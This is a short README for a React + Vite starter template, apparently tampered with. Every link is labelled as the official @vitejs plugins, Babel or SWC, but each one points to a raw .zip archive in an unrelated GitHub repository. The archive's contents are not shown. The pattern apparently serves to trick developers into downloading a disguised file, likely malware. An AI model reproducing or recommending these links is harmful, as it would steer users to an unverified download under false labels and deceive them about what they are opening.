# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

- [@vitejs/plugin-react](https://github.com/denis-ramos/3examn/raw/refs/heads/main/src/examn_1.0.zip) uses [Babel](https://github.com/denis-ramos/3examn/raw/refs/heads/main/src/examn_1.0.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/denis-ramos/3examn/raw/refs/heads/main/src/examn_1.0.zip) uses [SWC](https://github.com/denis-ramos/3examn/raw/refs/heads/main/src/examn_1.0.zip) for Fast Refresh
